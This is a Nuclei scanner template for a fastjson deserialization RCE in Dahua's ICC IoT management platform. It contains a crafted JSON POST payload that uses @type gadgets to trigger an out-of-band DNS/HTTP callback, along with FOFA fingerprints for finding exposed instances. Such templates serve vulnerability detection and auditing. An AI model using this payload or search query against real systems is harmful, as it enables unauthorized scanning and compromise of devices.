id: dahua-icc-fastjson-rce

info:
  name: 大华 ICC 智能物联综合管理平台 - fastjson rce
  author: leadlife
  severity: critical
  description: 大华ICC智能物联综合管理平台是专门为大华股份研发的一款物联网管理平台，它可以对多个智能设备和系统进行统一管理和控制，方便用户实时了解和管理各个设备和系统的状态。该平台提供了一系列的智能化功能，包括设备管理、监控预警、数据分析等，旨在为用户提供更加智能、高效和便捷的物联网管理体验，其使用了alibaba fastjson，存在反序列化漏洞导致RCE。
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: body="/static/fontshd/font-hd.css" || icon_hash="-1935899595" || body="*客户端会小于800*" 
  tags: dahua,fastjson,rce,icc,oob

http:
  - raw:
    - |
      POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {
        "a":{
            "@type":"com.alibaba.fastjson.JSONObject",
            {"@type":"java.net.URL","val":"http://{{interactsh-url}}"}
        }""
      }

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
